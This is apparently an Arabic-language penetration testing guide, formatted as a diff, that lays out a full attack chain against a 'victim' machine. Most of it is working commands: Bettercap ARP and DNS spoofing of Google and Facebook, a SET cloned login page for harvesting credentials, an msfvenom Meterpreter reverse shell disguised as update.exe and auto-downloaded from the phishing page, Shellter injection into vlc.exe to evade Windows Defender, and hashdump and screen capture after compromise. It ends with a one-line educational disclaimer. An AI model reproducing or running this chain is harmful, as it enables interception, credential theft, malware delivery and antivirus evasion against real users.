@@ -1,0 +1,103 @@
+🛡️ Full Penetration Testing Guide: MITM to Remote Access
+الموضوع: من هجوم رجل في المنتصف إلى السيطرة الكاملة على النظام.
+الإعداد: مختبر اختراق (Lab Environment).
+الأهداف: 192.168.1.1 (Gateway) | 192.168.1.4 (Victim).
+
+🛠️ المرحلة 1: إعداد النظام (System Preparation)
+قبل البدء، يجب تحويل جهاز Kali إلى "Router" ليمرر البيانات دون اكتشاف الهجوم.
+
+افتح التيرمينال واكتب:
+
+Bash
+
+sudo sysctl -w net.ipv4.ip_forward=1
+🔍 المرحلة 2: الاستطلاع واختيار الهدف (Reconnaissance)
+استخدام أداة Bettercap لتحديد الأجهزة النشطة.
+
+تشغيل الأداة:
+
+Bash
+
+sudo bettercap -iface eth0  # أو wlan0 للواي فاي
+تفعيل البحث عن الأجهزة:
+
+Bash
+
+net.probe on
+net.show
+(سجل IP الضحية: 192.168.1.4 والـ MAC Address الخاص به).
+
+⚡ المرحلة 3: الهجوم النشط (ARP & DNS Spoofing)
+الهدف: جعل الضحية يرسل كل طلباته لجهازك بدلاً من الراوتر.
+
+تحديد الهدف:
+
+Bash
+
+set arp.spoof.targets 192.168.1.4
+set arp.spoof.internal true
+arp.spoof on
+تفعيل التزوير (DNS Spoofing) لتوجيه الضحية لموقعك المزور:
+
+Bash
+
+set dns.spoof.domains google.com, facebook.com
+set dns.spoof.address [KALI_IP]  # ضع IP جهازك الكالي هنا
+dns.spoof on
+🎣 المرحلة 4: إنشاء الفخ (Credential Harvesting)
+استخدام أداة SET (Social-Engineer Toolkit) لإنشاء صفحة تسجيل دخول مزيفة.
+
+تشغيل الأداة: sudo setoolkit
+
+اختر المسار: 1 -> 2 -> 3 -> 2 (Site Cloner).
+
+أدخل IP جهازك الكالي، ثم أدخل رابط الموقع المراد تقليده (مثلاً صفحة الراوتر ZTE).
+(الآن أي شخص يزور الروابط في المرحلة 3 سيصل لصفحتك).
+
+🚀 المرحلة 5: السيطرة الكاملة (Payload & Reverse Shell)
+الهدف: الحصول على جلسة Meterpreter بمجرد ضغط الضحية على زر "Login".
+
+صنع الملف الخبيث (Msfvenom):
+
+Bash
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI_IP] LPORT=4444 -f exe > /var/www/html/update.exe
+تجهيز المستمع (Metasploit Listener):
+
+Bash
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST [KALI_IP]
+set LPORT 4444
+exploit
+تعديل صفحة الـ Phishing: أضف كود التحميل التلقائي لملف update.exe في صفحة HTML التي أنشأتها SET.
+
+🛡️ المرحلة 6: التشفير وتجاوز الحماية (Anti-Virus Evasion)
+لتجاوز Windows Defender، نستخدم أداة مثل Shellter (موجودة في Kali):
+
+قم بتشغيل shellter.
+
+اختر وضع A (Auto).
+
+حدد ملف .exe حقيقي (مثل vlc.exe) ليتم حقن الـ Payload داخله.
+
+اختر Payload: L (Listed) ثم رقم الـ Meterpreter Reverse TCP.
+
+أدخل الـ IP والـ Port الخاص بك.
+(الملف الناتج سيكون مشفراً ويصعب اكتشافه).
+
+🏁 المرحلة 7: ما بعد الاختراق (Post-Exploitation)
+بمجرد ظهور كلمة Meterpreter session 1 opened:
+
+sysinfo: لمعرفة تفاصيل الجهاز.
+
+hashdump: لسحب كلمات سر الويندوز.
+
+screenshot: لتصوير شاشة الضحية.
+
+shell: للتحكم الكامل في الـ Command Prompt.
+
+⚠️ تحذير أخلاقي (Ethical Warning):
+هذا الدليل مخصص للأغراض التعليمية وفهم كيفية حماية الشبكات فقط. تنفيذ هذه الهجمات على شبكات حقيقية بدون إذن رسمي يعرضك للمسائلة القانونية الصارمة.
